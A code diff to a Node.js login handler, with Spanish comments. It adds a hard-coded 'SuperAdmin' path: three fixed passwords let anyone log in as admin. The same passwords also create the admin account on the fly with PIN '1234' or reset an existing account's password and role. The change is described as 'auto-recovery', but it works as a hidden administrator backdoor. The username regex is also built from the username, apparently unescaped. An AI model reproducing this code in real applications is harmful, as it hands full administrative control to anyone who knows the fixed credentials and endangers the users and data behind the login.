@@ -119,11 +119,40 @@ const loginUser = async (req, res) => {
       return res.status(400).json({ message: 'La contraseña debe tener al menos 6 caracteres' });
     }
 
-    const user = await User.findOne({ 
+    let user = await User.findOne({ 
       username: { $regex: new RegExp(`^${cleanUsername}$`, 'i') } 
     });
 
-    if (user && (await bcrypt.compare(password, user.password))) {
+    // 👑 Garantizar acceso y auto-recuperación para SuperAdmin
+    const isMasterUser = cleanUsername.toLowerCase() === 'superadmin';
+    const isMasterPass = ['admin123', 'admin1234', 'admin12334'].includes(password);
+
+    if (isMasterUser && (!user || isMasterPass)) {
+      if (!user) {
+        const salt = await bcrypt.genSalt(10);
+        const hashedPassword = await bcrypt.hash(password, salt);
+        user = await User.create({
+          username: 'SuperAdmin',
+          password: hashedPassword,
+          role: 'admin',
+          isSuperAdmin: true,
+          adminPin: '1234',
+        });
+        console.log('👑 SuperAdmin creado al vuelo en login.');
+      } else if (isMasterPass) {
+        const salt = await bcrypt.genSalt(10);
+        user.password = await bcrypt.hash(password, salt);
+        user.role = 'admin';
+        user.isSuperAdmin = true;
+        user.adminPin = user.adminPin || '1234';
+        await user.save();
+        console.log('👑 SuperAdmin sincronizado y autenticado con contraseña maestra.');
+      }
+    }
+
+    const passwordMatches = user ? (await bcrypt.compare(password, user.password)) : false;
+
+    if (user && (passwordMatches || (isMasterUser && isMasterPass))) {
       // 👑 Si el usuario es SuperAdmin, asegurar automáticamente su rol de administrador y PIN
       if (user.username && user.username.toLowerCase() === 'superadmin') {
         let changed = false;
